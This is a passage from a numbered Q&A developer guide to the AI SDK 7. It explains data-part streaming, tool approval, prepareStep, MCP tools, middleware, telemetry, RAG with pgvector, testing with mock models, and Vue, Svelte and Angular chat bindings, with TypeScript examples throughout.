const messages = await validateUIMessages({
  messages: body.messages,
  tools,
  metadataSchema,
  dataSchemas,
});
```

This also catches old saved messages whose tool shapes no longer match your current tools.

## 154: How do you stream custom data alongside the model answer?

Use `createUIMessageStream`. Its `execute` function gets a `writer`. You write your own data parts with `writer.write` and add the model output with `writer.merge`.

```ts
import {
  createUIMessageStream,
  createUIMessageStreamResponse,
  streamText,
  toUIMessageStream,
} from "ai";

const stream = createUIMessageStream({
  execute: async ({ writer }) => {
    writer.write({
      type: "data-status",
      data: { text: "Searching documents..." },
    });

    const docs = await searchDocs(query);

    const result = streamText({
      model: "openai/gpt-5.5",
      instructions: `Use these docs:\n${docs}`,
      prompt: query,
    });

    writer.merge(toUIMessageStream({ stream: result.stream }));
  },
});

return createUIMessageStreamResponse({ stream });
```

## 155: How do you update a data part instead of adding a new one?

Write the data part with an `id`. When you write again with the same `type` and `id`, the client replaces the old part instead of adding another one.

```ts
writer.write({ type: "data-progress", id: "upload", data: { percent: 10 } });
// later
writer.write({ type: "data-progress", id: "upload", data: { percent: 100 } });
```

This is how you show a progress bar or a status line that changes over time.

## 156: What are transient data parts?

A transient data part is sent to the client but not added to the message history. You mark it with `transient: true`. The client receives it only in the `onData` callback of `useChat`.

```ts
writer.write({
  type: "data-notification",
  data: { message: "Done" },
  transient: true,
});
```

Use it for short-lived things like toasts, so they don't end up in saved messages or in the model prompt.

## 157: How do you get type safety for data parts and metadata on the client?

Define a custom `UIMessage` type with the metadata type and data part types, and pass it as a generic to `useChat`.

```ts
import type { UIMessage } from "ai";

type MyMessage = UIMessage<
  { createdAt: number },
  { weather: { city: string; tempC: number }; status: { text: string } }
>;

const { messages } = useChat<MyMessage>();
// part.type === 'data-weather' gives part.data typed as { city; tempC }
```

You can also pass `dataPartSchemas` and `messageMetadataSchema` to validate them at runtime.

## 158: How do you add metadata like token usage to the assistant message?

Use the `messageMetadata` callback of `toUIMessageStream`. It runs for stream parts like `start` and `finish`, and whatever it returns is merged into the message metadata.

```ts
toUIMessageStream({
  stream: result.stream,
  messageMetadata: ({ part }) => {
    if (part.type === "start") return { createdAt: Date.now() };
    if (part.type === "finish")
      return { totalTokens: part.totalUsage.totalTokens };
  },
});
```

## 159: How do you type tool parts in the UI?

Use `InferUITools` (or `InferUITool`) on your tool set and put the result in your `UIMessage` type. Then `part.input` and `part.output` are typed per tool.

```ts
import type { InferUITools, UIMessage, UIDataTypes } from "ai";
import { tools } from "./tools";

type MyTools = InferUITools<typeof tools>;
export type ChatMessage = UIMessage<never, UIDataTypes, MyTools>;
```

For agents, `InferAgentUIMessage<typeof agent>` does all of this in one step.

## 160: How do you add authentication headers to useChat requests?

Pass `headers` to `DefaultChatTransport`. It can be an object or a function, so you can read a fresh token on each request.

```tsx
new DefaultChatTransport({
  api: "/api/chat",
  headers: () => ({ Authorization: `Bearer ${getToken()}` }),
});
```

You can also pass `credentials: 'include'` to send cookies to a different origin. Always check the user on the server, not only on the client.

## 161: How do you send extra fields like the selected model to the server?

Add them to the body. You can set a static `body` on the transport, or pass `body` per request in `sendMessage`.

```tsx
sendMessage({ text: input }, { body: { model: selectedModel } });
```

On the server, read `model` from the request and check it against an allowlist before passing it to `streamText`, so users can't pick any model they like.

## 162: How does tool approval work in AI SDK 7?

You set `toolApproval` on `generateText`, `streamText` or `ToolLoopAgent`. For each tool you choose a status: `'not-applicable'`, `'approved'`, `'denied'` or `'user-approval'`. You can also pass a function that decides per call.

```ts
const result = streamText({
  model: "anthropic/claude-sonnet-5.5",
  tools: { deleteFile, readFile },
  toolApproval: {
    deleteFile: "user-approval",
    readFile: "approved",
  },
  messages,
});
```

A tool that needs user approval is not run. The stream sends an approval request, and the UI shows the tool part in the `approval-requested` state.

## 163: How does the user approve a tool call in the UI?

When a tool part is in the `approval-requested` state, show buttons and call `addToolApprovalResponse` with the approval `id`.

```tsx
if (part.state === "approval-requested") {
  return (
    <div>
      Delete {part.input.path}?
      <button
        onClick={() =>
          addToolApprovalResponse({ id: part.approval.id, approved: true })
        }
      >
        Yes
      </button>
      <button
        onClick={() =>
          addToolApprovalResponse({
            id: part.approval.id,
            approved: false,
            reason: "User said no",
          })
        }
      >
        No
      </button>
    </div>
  );
}
```

Use `sendAutomaticallyWhen: lastAssistantMessageIsCompleteWithApprovalResponses` so the chat continues once all approvals are answered. If denied, the part goes to `output-denied` and the model is told the call was refused.

## 164: What was needsApproval and why was it deprecated?

`needsApproval` was an option on `tool()` in AI SDK 6 that marked a tool as needing user approval. AI SDK 7 moved approval to the call level with `toolApproval`, because whether a tool needs approval often depends on the user, the app or the situation, not on the tool itself.

`needsApproval` still works but is deprecated, and `toolApproval` takes precedence when both are set.

## 165: How do you decide approval based on the tool's input?

Give a function instead of a fixed status. It gets the tool input and returns a status.

```ts
toolApproval: {
  transferMoney: (input) => (input.amount > 1000 ? 'user-approval' : 'approved'),
},
```

You can also pass one function for all tools that receives the `toolCall` and returns a status, which is handy when the rule depends on the user's role.

## 166: What is prepareStep?

`prepareStep` runs before every step of a multi-step call. It gets the step number, the previous steps and the messages, and can return changes for this step only: a different model, different `activeTools`, `toolChoice`, `instructions`, `messages` or settings.

```ts
prepareStep: async ({ stepNumber, messages }) => {
  if (stepNumber === 0) {
    return { toolChoice: { type: 'tool', toolName: 'searchDocs' } };
  }
  if (messages.length > 30) {
    return { messages: messages.slice(-20) };
  }
},
```

Returning nothing keeps the default settings. It was `experimental_prepareStep` before AI SDK 7.

## 167: How can prepareStep cut costs in an agent?

You can switch models per step. For example, use a cheap model for simple tool-calling steps and a stronger model only for the final answer, or trim old messages and tool results when the history gets long.

```ts
prepareStep: ({ stepNumber }) =>
  stepNumber > 0 ? { model: 'openai/gpt-5.4-mini' } : undefined,
```

## 168: How do you write a custom stop condition?

A stop condition is a function that gets `{ steps }` and returns `true` to stop. It can be async.

```ts
import type { StopCondition } from 'ai';

const tooExpensive: StopCondition<any> = ({ steps }) => {
  const tokens = steps.reduce((sum, s) => sum + (s.usage.outputTokens ?? 0), 0);
  return tokens > 20_000;
};

stopWhen: [isStepCount(15), tooExpensive],
```

It is checked only after steps that ended with tool calls.

## 169: How do you combine tools and structured output in one call?

Pass both `tools` and `output`. The model can call tools over several steps, and the final step must produce output that matches the schema.

```ts
const { output } = await generateText({
  model: "openai/gpt-5.5",
  tools: { getWeather },
  stopWhen: isStepCount(5),
  output: Output.object({
    schema: z.object({ city: z.string(), advice: z.string() }),
  }),
  prompt: "Should I bring an umbrella in Paris today?",
});
```

Count the final output step when you set `stopWhen`, or you may stop before the model writes the structured result.

## 170: What is repairToolCall?

`repairToolCall` is a function the SDK calls when a tool call fails with `NoSuchToolError` or `InvalidToolInputError`. It gets the bad tool call, the error, the tools and a helper to get each tool's JSON Schema. You return a fixed tool call or `null` to give up.

```ts
repairToolCall: async ({ toolCall, error, inputSchema }) => {
  if (error.name !== 'AI_InvalidToolInputError') return null;
  const { output } = await generateText({
    model: 'openai/gpt-5.4-mini',
    output: Output.json(),
    prompt: `Fix these arguments to match the schema.\nSchema: ${JSON.stringify(await inputSchema({ toolName: toolCall.toolName }))}\nArguments: ${toolCall.input}`,
  });
  return { ...toolCall, input: JSON.stringify(output) };
},
```

It used to be `experimental_repairToolCall`.

## 171: What is toModelOutput on a tool?

`toModelOutput` changes what the model sees as the tool result, while your app still gets the full result. For example, a tool can return a big object for the UI but send only a short summary or an image to the model.

```ts
const screenshot = tool({
  description: "Take a screenshot",
  inputSchema: z.object({}),
  execute: async () => ({ base64: await takeScreenshot() }),
  toModelOutput: ({ output }) => ({
    type: "content",
    value: [{ type: "file", data: output.base64, mediaType: "image/png" }],
  }),
});
```

The function runs inside `convertToModelMessages` too, so pass the same tools there.

## 172: Why should you pass tools to convertToModelMessages?

Some tool features, like `toModelOutput`, are applied when UI messages are turned into model messages. If you don't pass `tools`, the SDK can't apply them and the model gets the raw output instead.

```ts
const modelMessages = await convertToModelMessages(messages, { tools });
```

## 173: What is runtimeContext?

`runtimeContext` is an object you pass to `generateText`, `streamText` or an agent that flows through the whole call. It is available in `prepareStep`, in callbacks, in tool approval functions and in telemetry.

```ts
await generateText({
  model,
  prompt,
  runtimeContext: { userId: session.user.id, plan: "pro" },
  prepareStep: ({ runtimeContext }) =>
    runtimeContext.plan === "free"
      ? { model: "openai/gpt-5.4-mini" }
      : undefined,
});
```

It replaces the older `experimental_context` option.

## 174: How do tools get context like the current user?

Give the tool a `contextSchema` and pass values in `toolsContext` on the call, keyed by tool name. The tool reads it from `context` in its `execute` options.

```ts
const getOrders = tool({
  description: "List the current user's orders",
  inputSchema: z.object({}),
  contextSchema: z.object({ userId: z.string() }),
  execute: async (_, { context }) =>
    db.orders.findMany({ where: { userId: context.userId } }),
});

await generateText({
  model,
  tools: { getOrders },
  toolsContext: { getOrders: { userId: session.user.id } },
  prompt: "What did I order last week?",
});
```

This keeps things like user IDs out of the model's arguments, so the model can't ask for another user's data.

## 175: What lifecycle callbacks do generateText and streamText have in AI SDK 7?

- `onStart`: before the first step.
- `onStepStart`: before each step.
- `onLanguageModelCallStart` / `onLanguageModelCallEnd`: around each model request.
- `onToolExecutionStart` / `onToolExecutionEnd`: around each tool run.
- `onStepEnd`: after each step.
- `onStepError`: when a step fails.
- `onEnd`: after everything is done.

`streamText` also has `onChunk`, `onError` and `onAbort`. The old names `onFinish`, `onStepFinish`, `experimental_onStart` and `experimental_onToolCallStart` still work but are deprecated.

## 176: How do you log the time each tool takes?

Use `onToolExecutionStart` and `onToolExecutionEnd`, or read the timing from step performance data. The callbacks are simple to wire to a logger.

```ts
const started = new Map<string, number>();

await generateText({
  model,
  tools,
  onToolExecutionStart: ({ toolCall }) =>
    started.set(toolCall.toolCallId, Date.now()),
  onToolExecutionEnd: ({ toolCall }) =>
    console.log(
      toolCall.toolName,
      Date.now() - started.get(toolCall.toolCallId)!,
      "ms",
    ),
  prompt,
});
```

## 177: How do you use the agent from a Next.js route?

Use `createAgentUIStreamResponse`. It takes the agent and the UI messages and returns a streaming response that `useChat` understands.

```ts
import { createAgentUIStreamResponse } from "ai";
import { supportAgent } from "@/agents/support";

export async function POST(req: Request) {
  const { messages } = await req.json();
  return createAgentUIStreamResponse({
    agent: supportAgent,
    uiMessages: messages,
  });
}
```

On the client, type the hook with `useChat<InferAgentUIMessage<typeof supportAgent>>()` so tool parts are typed.

## 178: When should you use ToolLoopAgent instead of calling generateText directly?

Use `ToolLoopAgent` when the same setup (model, instructions, tools, stop rules) is used in more than one place, like an API route, a background job and tests. It keeps the agent's config in one object and gives you typed UI messages.

For a one-off call in one place, `generateText` or `streamText` with tools is simpler and does the same work.

## 179: What are call options on a ToolLoopAgent?

Call options let you pass typed, per-call input to an agent, and use `prepareCall` to turn it into settings. For example, a user ID or a subscription tier that changes the instructions or the model.

```ts
const agent = new ToolLoopAgent({
  model: "openai/gpt-5.5",
  callOptionsSchema: z.object({ tier: z.enum(["free", "pro"]) }),
  prepareCall: ({ options, ...settings }) => ({
    ...settings,
    model: options.tier === "pro" ? "openai/gpt-5.5" : "openai/gpt-5.4-mini",
  }),
  tools,
});

await agent.generate({ prompt: "Hi", options: { tier: "pro" } });
```

## 180: How do you use MCP tools with generateText?

Create the client, get the tools and pass them in `tools`. Close the client when you're done, for example in `onEnd` for streaming.

```ts
import { createMCPClient } from "@ai-sdk/mcp";
import { streamText } from "ai";

const mcp = await createMCPClient({
  transport: { type: "http", url: process.env.MCP_URL! },
});

const result = streamText({
  model: "anthropic/claude-sonnet-5.5",
  tools: await mcp.tools(),
  prompt: "List my open GitHub issues",
  onEnd: async () => {
    await mcp.close();
  },
});
```

## 181: What MCP transports does the AI SDK client support?

It supports HTTP (Streamable HTTP, the recommended one for remote servers), SSE (the older remote transport) and stdio for local servers. Stdio comes from `@ai-sdk/mcp/mcp-stdio` and only works in Node.js, since it starts a child process.

```ts
import { StdioMCPTransport } from "@ai-sdk/mcp/mcp-stdio";

const client = await createMCPClient({
  transport: new StdioMCPTransport({ command: "node", args: ["server.js"] }),
});
```

## 182: How do you get typed MCP tools?

By default MCP tools are dynamic, with `unknown` input. You can pass schemas for the tools you care about, and the client returns typed tools for just those.

```ts
const tools = await mcp.tools({
  schemas: {
    getIssue: { inputSchema: z.object({ number: z.number() }) },
  },
});
```

Only the tools listed in `schemas` are loaded in that case.

## 183: How do you write language model middleware?

A middleware is an object with `specificationVersion: 'v4'` and any of `transformParams`, `wrapGenerate` and `wrapStream`.

```ts
import type { LanguageModelMiddleware } from "ai";

export const logMiddleware: LanguageModelMiddleware = {
  specificationVersion: "v4",
  wrapGenerate: async ({ doGenerate, params }) => {
    console.log("prompt", params.prompt);
    const result = await doGenerate();
    console.log("usage", result.usage);
    return result;
  },
};
```

`transformParams` changes the call options before the request. `wrapGenerate` and `wrapStream` wrap the actual call.

## 184: How do you apply several middlewares to one model?

Pass an array to `wrapLanguageModel`. They are applied in order: the first middleware wraps the outside.

```ts
const model = wrapLanguageModel({
  model: openai("gpt-5.5"),
  middleware: [logMiddleware, cacheMiddleware, guardrailMiddleware],
});
```

So `logMiddleware` sees the request first and the response last.

## 185: How do you use extractReasoningMiddleware?

Some open models write their reasoning inside tags like `<think>...</think>` in normal text. This middleware moves that text into proper reasoning parts.

```ts
import { wrapLanguageModel, extractReasoningMiddleware } from "ai";

const model = wrapLanguageModel({
  model: groq("deepseek-r1-distill-llama-70b"),
  middleware: extractReasoningMiddleware({ tagName: "think" }),
});
```

Use `startWithReasoning: true` if the model leaves out the opening tag.

## 186: How do you set up OpenTelemetry tracing in AI SDK 7?

Register an OpenTelemetry integration once at startup with `registerTelemetry`. Then every AI SDK call creates spans for the call, the steps, model requests and tool runs.

```ts
import { registerTelemetry } from "ai";
import { OpenTelemetry } from "@ai-sdk/otel";

registerTelemetry(new OpenTelemetry());
```

Per call, you can set `telemetry: { functionId: 'support-chat', recordInputs: false }`. In AI SDK 6 and earlier you turned it on per call with `experimental_telemetry: { isEnabled: true }`.

## 187: Why would you set recordInputs or recordOutputs to false?

By default, telemetry records prompts and outputs on spans. They can contain personal data, secrets or large documents. Turning them off keeps that data out of your tracing system while still keeping timing, token usage and errors.

## 188: What is functionId in telemetry?

`functionId` is a name you give to a call, like `'summarize-ticket'`. It appears on the spans so you can filter and group traces by feature in tools like Langfuse, Datadog or Honeycomb.

## 189: How do you handle rate limit errors?

The SDK already retries retryable errors like 429 up to `maxRetries` times with backoff. If that's not enough, you can raise `maxRetries`, add a fallback model, queue requests, or catch `RetryError` and show a friendly message.

```ts
import { RetryError } from "ai";

try {
  await generateText({ model, prompt, maxRetries: 4 });
} catch (e) {
  if (RetryError.isInstance(e)) {
    console.log(e.reason, e.errors.length);
  }
}
```

## 190: How do you add a fallback model when a provider is down?

With the AI Gateway you can list fallback models in the gateway provider options, and the gateway tries them in order. Without the gateway, you catch the error and call again with another model, or write middleware that does this.

```ts
await generateText({
  model: "anthropic/claude-sonnet-5.5",
  prompt,
  providerOptions: {
    gateway: { models: ["openai/gpt-5.5", "google/gemini-3.5-flash"] },
  },
});
```

## 191: How do you limit which providers the AI Gateway uses?

Use gateway provider options like `order` (preferred providers, in order) and `only` (allowed providers). This matters when a model is offered by several hosts, for example an open model on different clouds, or when you have data rules.

```ts
providerOptions: {
  gateway: { order: ['bedrock', 'anthropic'], only: ['bedrock', 'anthropic'] },
},
```

## 192: How do you use prompt caching with Anthropic?

Anthropic needs you to mark which parts can be cached. In the AI SDK you set `cacheControl` in the Anthropic provider options on a message or part.

```ts
await generateText({
  model: anthropic("claude-sonnet-5.5"),
  messages: [
    {
      role: "user",
      content: [
        {
          type: "text",
          text: longDocument,
          providerOptions: {
            anthropic: { cacheControl: { type: "ephemeral" } },
          },
        },
        { type: "text", text: "Summarize section 3." },
      ],
    },
  ],
});
```

Cached tokens show up in `usage.inputTokenDetails.cacheReadTokens`. OpenAI caches long prompts automatically, without a flag.

## 193: How do you read cached and reasoning token counts?

They are inside the usage details:

```ts
const { usage } = await generateText({ model, prompt });

usage.inputTokenDetails.cacheReadTokens; // read from cache
usage.inputTokenDetails.cacheWriteTokens; // written to cache
usage.outputTokenDetails.reasoningTokens; // spent on reasoning
```

In AI SDK 5 these were top-level fields `cachedInputTokens` and `reasoningTokens`. They were moved in AI SDK 6 and the old fields are removed in 7.

## 194: How do you resume a stream after the user refreshes the page?

You need to store the stream on the server, for example with the `resumable-stream` package and Redis, and add a GET endpoint that returns the active stream for a chat. On the client, set `resume: true` in `useChat`.

```tsx
const { messages } = useChat({
  id: chatId,
  messages: initialMessages,
  resume: true,
});
```

When the page loads, the hook calls the reconnect endpoint and keeps reading the answer from where the server is.

## 195: What is the catch with resume and stop?

When a stream is resumable, the server keeps generating even if the client disconnects. That's the point, but it also means `stop()` on the client only stops reading. To really stop generation, you need your own endpoint that cancels the stream on the server.

## 196: How do you build a chat that lets the user pick the model?

Send the chosen model ID in the request body, check it against a list on the server, and pass it to `streamText`. With the AI Gateway, a string ID is enough.

```ts
const allowed = new Set(["openai/gpt-5.5", "anthropic/claude-sonnet-5.5"]);

export async function POST(req: Request) {
  const { messages, model } = await req.json();
  if (!allowed.has(model)) return new Response("Bad model", { status: 400 });

  const result = streamText({
    model,
    messages: await convertToModelMessages(messages),
  });
  return createUIMessageStreamResponse({
    stream: toUIMessageStream({ stream: result.stream }),
  });
}
```

## 197: How do you show the reasoning in the chat UI?

Reasoning comes as `reasoning` parts. Render them, often in a collapsed block above the answer.

```tsx
{
  message.parts.map((part, i) =>
    part.type === "reasoning" ? (
      <details key={i}>
        <summary>Thinking</summary>
        <pre>{part.text}</pre>
      </details>
    ) : part.type === "text" ? (
      <p key={i}>{part.text}</p>
    ) : null,
  );
}
```

On the server, `toUIMessageStream` sends reasoning by default. Set `sendReasoning: false` to hide it.

## 198: How do you show sources in the chat UI?

Sources come as `source-url` parts (and `source-document` parts). `toUIMessageStream` does not send them unless you set `sendSources: true`.

```ts
toUIMessageStream({ stream: result.stream, sendSources: true });
```

```tsx
{
  message.parts
    .filter((p) => p.type === "source-url")
    .map((p) => (
      <a key={p.sourceId} href={p.url}>
        {p.title ?? p.url}
      </a>
    ));
}
```

## 199: How do you return errors to the client with more detail?

By default, error details are hidden and the client gets a generic message, so you don't leak secrets or stack traces. You can pass an `onError` function to `toUIMessageStream` that returns the text to send.

```ts
toUIMessageStream({
  stream: result.stream,
  onError: (error) => {
    if (APICallError.isInstance(error) && error.statusCode === 429) {
      return "Too many requests, please wait a moment.";
    }
    return "Something went wrong.";
  },
});
```

## 200: How do you share chat state between two components?

Create a `Chat` instance and pass it to `useChat({ chat })` in each component, or use the same `id` in both `useChat` calls. Both components then see the same messages and status.

```tsx
const chat = new Chat({
  transport: new DefaultChatTransport({ api: "/api/chat" }),
});

function Messages() {
  const { messages } = useChat({ chat });
  // ...
}

function Input() {
  const { sendMessage } = useChat({ chat });
  // ...
}
```

## 201: How do you build simple RAG with the AI SDK?

RAG (retrieval-augmented generation) means finding relevant text and giving it to the model with the question. With the AI SDK the flow is:

1. Split your documents into chunks and embed them with `embedMany`. Store the vectors.
2. When a question comes in, embed it with `embed`.
3. Find the closest chunks in your vector store.
4. Put those chunks in the prompt and call `generateText` or `streamText`.

```ts
const { embedding } = await embed({
  model: "openai/text-embedding-3-small",
  value: question,
});
const chunks = await vectorStore.search(embedding, { limit: 5 });

const result = streamText({
  model: "openai/gpt-5.5",
  instructions: `Answer using only this context:\n${chunks.map((c) => c.text).join("\n---\n")}`,
  prompt: question,
});
```

The AI SDK does not include a vector database. You use one like pgvector, Pinecone or Upstash Vector.

## 202: What is the difference between classic RAG and RAG as a tool?

In classic RAG you always search before calling the model. In RAG as a tool, you give the model a search tool and it decides when to search and what to search for. It can also search several times with different queries.

The tool approach handles follow-up questions and small talk better, but costs extra steps and gives you less control. Many apps start with the tool approach because it's easy with the AI SDK's tool loop.

## 203: Does the AI SDK split documents into chunks for you?

No. The SDK embeds the text you give it, but chunking is up to you. Common approaches are splitting by paragraphs or headings, or by a fixed size with some overlap. Chunk size matters: too large and the embedding gets vague, too small and chunks lose their context.

## 204: How do you store and search embeddings in Postgres?

Use the pgvector extension. Store each chunk with its vector and search with a distance operator.

```ts
const { embedding } = await embed({
  model: "openai/text-embedding-3-small",
  value: question,
});

const rows = await sql`
  SELECT content, 1 - (embedding <=> ${JSON.stringify(embedding)}::vector) AS similarity
  FROM chunks
  ORDER BY embedding <=> ${JSON.stringify(embedding)}::vector
  LIMIT 5
`;
```

`<=>` is cosine distance in pgvector. Add an HNSW or IVFFlat index once you have many rows.

## 205: What does the dimensions option in embed do?

Some embedding models let you ask for shorter vectors, for example 512 values instead of 1536. Shorter vectors use less storage and are faster to search, with some loss in quality.

```ts
await embed({
  model: "openai/text-embedding-3-small",
  value: text,
  dimensions: 512,
});
```

All vectors you compare must use the same model and the same dimension count.

## 206: What does maxParallelCalls do in embedMany?

When `embedMany` splits a big list into several requests, `maxParallelCalls` limits how many of those requests run at the same time. Lower it if you hit rate limits. By default the calls are not limited.

## 207: Can you add middleware to embedding models?

Yes. `wrapEmbeddingModel` works like `wrapLanguageModel`. For example, `defaultEmbeddingSettingsMiddleware` can set default `dimensions` or provider options, and you can write your own middleware for caching embeddings.

```ts
import { wrapEmbeddingModel, defaultEmbeddingSettingsMiddleware } from "ai";

const model = wrapEmbeddingModel({
  model: openai.embedding("text-embedding-3-small"),
  middleware: defaultEmbeddingSettingsMiddleware({
    settings: { dimensions: 512 },
  }),
});
```

## 208: How do you edit an image with generateImage?

Pass the prompt as an object with `text` and the input `images`. The model must support editing.

```ts
import { readFile } from "node:fs/promises";

const { image } = await generateImage({
  model: openai.image("gpt-image-2"),
  prompt: {
    text: "Make the background a beach at sunset",
    images: [await readFile("photo.png")],
  },
});
```

## 209: How do n and maxImagesPerCall work in generateImage?

`n` is how many images you want. Some models can only make one or a few images per request, so the SDK splits the work into several calls. `maxImagesPerCall` lets you override that per-call limit if the default is wrong for your model.

The result has `images` (all of them) and `image` (the first one).

## 210: How do you get images from a language model like Gemini?

Some language models can output images as part of their answer. They come back as files on the result, not from `generateImage`.

```ts
const result = await generateText({
  model: "google/gemini-3.1-flash-image",
  prompt: "Draw a simple logo for a bakery",
});

for (const file of result.files) {
  if (file.mediaType.startsWith("image/")) {
    // file.base64 or file.uint8Array
  }
}
```

In the UI they arrive as `file` parts.

## 211: How do you show a tool call while the model is still writing its arguments?

With `streamText`, tool inputs stream too. In the UI the tool part starts in the `input-streaming` state with a partial `input`, then moves to `input-available` once the arguments are complete. You can render the partial input, for example to show a document being written.

On the server, a tool can react to this with `onInputStart` and `onInputDelta`.

## 212: How does a tool send progress updates before its final result?

Write `execute` as an async generator. Each `yield` sends a preliminary result to the UI, and the last value is the final result that the model sees.

```ts
const research = tool({
  description: "Research a topic",
  inputSchema: z.object({ topic: z.string() }),
  async *execute({ topic }) {
    yield { status: "searching", progress: 0 };
    const results = await search(topic);
    yield { status: "reading", progress: 50 };
    const summary = await summarize(results);
    yield { status: "done", progress: 100, summary };
  },
});
```

In the UI the tool part has `preliminary: true` for the in-between outputs.

## 213: How do you test code that uses streamText?

Use `MockLanguageModelV4` with a `doStream` that returns a stream built with `simulateReadableStream`.

```ts
import { streamText, simulateReadableStream } from "ai";
import { MockLanguageModelV4 } from "ai/test";

const model = new MockLanguageModelV4({
  doStream: async () => ({
    stream: simulateReadableStream({
      chunks: [
        { type: "text-start", id: "t1" },
        { type: "text-delta", id: "t1", delta: "Hello" },
        { type: "text-delta", id: "t1", delta: " world" },
        { type: "text-end", id: "t1" },
        {
          type: "finish",
          finishReason: { unified: "stop", raw: "stop" },
          usage: {
            inputTokens: { total: 3, noCache: 3, cacheRead: 0, cacheWrite: 0 },
            outputTokens: { total: 2, text: 2, reasoning: 0 },
          },
        },
      ],
    }),
  }),
});

const result = streamText({ model, prompt: "Hi" });
expect(await result.text).toBe("Hello world");
```

## 214: How do you test a tool on its own?

A tool is a plain object, so you can call its `execute` directly with input and options. That way you test your logic without a model.

```ts
const output = await getWeather.execute!(
  { city: "Lisbon" },
  { toolCallId: "test", messages: [], context: undefined },
);
expect(output.city).toBe("Lisbon");
```

Keep the real logic in a normal function and have `execute` call it, so most tests don't even need the tool object.

## 215: How do you test the quality of model answers?

Unit tests with mocks check your code, not the model. For quality you need evals: a set of test inputs with expected results, run against the real model. You score answers with exact checks (for structured output), simple rules, or a second model that grades the answer ("LLM as a judge").

Run evals when you change prompts, tools or models, so you notice when quality drops.

## 216: How do you deal with long conversations that grow past the context window?

Options include:

- Send only the last N messages.
- Use `pruneMessages` to drop old reasoning and tool calls.
- Summarize older messages with a cheaper model and send the summary instead.
- Store facts in a database and look them up with a tool.

You can do this in `prepareStep` for agents, or before calling `streamText` in a chat route.

## 217: How would you summarize old messages to save tokens?

When the history gets long, take the older part, ask a cheap model to summarize it, and replace it with one message that holds the summary.

```ts
if (messages.length > 40) {
  const old = messages.slice(0, -10);
  const { text: summary } = await generateText({
    model: "openai/gpt-5.4-mini",
    instructions:
      "Summarize this conversation. Keep names, decisions and open questions.",
    messages: old,
  });
  messages = [
    { role: "user", content: `Summary of earlier conversation: ${summary}` },
    ...messages.slice(-10),
  ];
}
```

Save the summary so you don't redo it on every request.

## 218: How do you give an agent different tools at different stages?

Use `prepareStep` to change `activeTools` based on the step number or on what happened so far.

```ts
prepareStep: ({ steps }) => {
  const hasPlan = steps.some((s) => s.toolCalls.some((c) => c.toolName === 'makePlan'));
  return { activeTools: hasPlan ? ['readFile', 'writeFile'] : ['makePlan'] };
},
```

This keeps the model focused and stops it from jumping to actions before it has a plan.

## 219: Does the SDK run several tool calls from one step in parallel?

Yes. If the model asks for several tool calls in one step, the SDK runs them at the same time by default and waits for all of them before the next step.

You can change this with `toolCallConcurrency`. Setting it to 1 runs them one by one in the order the model asked, which matters when tools change shared state.

## 220: How do you build a sub-agent?

Wrap an agent call inside a tool. The main agent calls the tool with a task, and the tool runs another agent with its own instructions and tools and returns its answer.

```ts
const researchAgent = new ToolLoopAgent({
  model,
  instructions: "You research topics.",
  tools: { webSearch },
});

const research = tool({
  description: "Ask the research agent to look something up",
  inputSchema: z.object({ task: z.string() }),
  execute: async ({ task }, { abortSignal }) => {
    const { text } = await researchAgent.generate({
      prompt: task,
      abortSignal,
    });
    return text;
  },
});
```

The sub-agent's long history stays out of the main agent's context, and only its final answer comes back.

## 221: How do you stop generation on the server when the client disconnects?

Pass the request's signal as `abortSignal`. When the client goes away, the provider request is cancelled and tool `abortSignal`s fire too. `onAbort` runs so you can save what you have.

```ts
const result = streamText({
  model,
  messages,
  abortSignal: req.signal,
  onAbort: ({ steps }) => {
    console.log("aborted after", steps.length, "steps");
  },
});
```

If you'd rather finish the answer anyway, don't pass the signal and call `result.consumeStream()`.

## 222: How do you save a partial answer when the user clicks stop?

On the server, `toUIMessageStream`'s `onEnd` gets `isAborted`, and the messages include what was streamed before the stop. Save them as usual, maybe with a flag.

```ts
toUIMessageStream({
  stream: result.stream,
  originalMessages: messages,
  onEnd: async ({ messages, isAborted }) => {
    await saveChat({ chatId, messages, aborted: isAborted });
  },
});
```

On the client, `onFinish` of `useChat` also gets `isAbort`.

## 223: How do you rate-limit a chat endpoint?

Check a rate limit before calling the model, based on user ID or IP. A common choice is a Redis-based limiter like `@upstash/ratelimit`.

```ts
const { success } = await ratelimit.limit(userId);
if (!success) return new Response("Too many requests", { status: 429 });
```

Also set `maxOutputTokens` and a step limit, so one request can't run up a big bill.

## 224: Can you call generateText from a Next.js Server Action?

Yes. Server Actions run on the server, so you can call `generateText` and return the text or the structured output. For streaming to the client, an API route with `useChat` is the usual setup, because hooks expect an HTTP stream.

```ts
"use server";
import { generateText } from "ai";

export async function summarize(text: string) {
  const { text: summary } = await generateText({
    model: "openai/gpt-5.5",
    prompt: `Summarize:\n${text}`,
  });
  return summary;
}
```

## 225: Why do some chat routes set maxDuration?

Serverless platforms stop functions after a time limit. Model answers, and especially agents with many steps, can take longer than the default. On Vercel with Next.js you raise the limit per route.

```ts
export const maxDuration = 60; // seconds
```

For very long agent runs, use a background job or a durable workflow instead of one long HTTP request.

## 226: Why might streaming not work behind a proxy?

Some proxies and servers buffer the whole response, or compress it in a way that waits for more data, so the client gets everything at the end. The UI message stream response sets headers like `x-accel-buffering: no` and `cache-control: no-cache` to prevent this, but your proxy config may still buffer.

If you build the response yourself, use `UI_MESSAGE_STREAM_HEADERS` from `ai`, and check that compression and buffering are off for that route.

## 227: How do you use useChat in Vue?

Import `useChat` from `@ai-sdk/vue`. It returns refs (for example `messages` is a shallow ref), which Vue unwraps for you in the template.

```vue
<script setup lang="ts">
import { useChat } from "@ai-sdk/vue";
import { ref } from "vue";

const { messages, sendMessage } = useChat();
const input = ref("");

function submit() {
  sendMessage({ text: input.value });
  input.value = "";
}
</script>

<template>
  <div v-for="m in messages" :key="m.id">
    <span v-for="(p, i) in m.parts" :key="i">{{
      p.type === "text" ? p.text : ""
    }}</span>
  </div>
  <form @submit.prevent="submit"><input v-model="input" /></form>
</template>
```

In AI SDK 7 the Vue `Chat` class is deprecated in favor of this composable.

## 228: How do you use the AI SDK in Svelte?

`@ai-sdk/svelte` exports a `Chat` class. You create it in your component and read its reactive properties.

```svelte
<script lang="ts">
  import { Chat } from '@ai-sdk/svelte';

  let input = $state('');
  const chat = new Chat({});

  function submit(e: SubmitEvent) {
    e.preventDefault();
    chat.sendMessage({ text: input });
    input = '';
  }
</script>

{#each chat.messages as message (message.id)}
  {#each message.parts as part}
    {#if part.type === 'text'}<p>{part.text}</p>{/if}
  {/each}
{/each}

<form onsubmit={submit}><input bind:value={input} /></form>
```

## 229: How do you use the AI SDK in Angular?

`@ai-sdk/angular` also uses a `Chat` class. You create it in a component and use its signal-based state in the template.

```ts
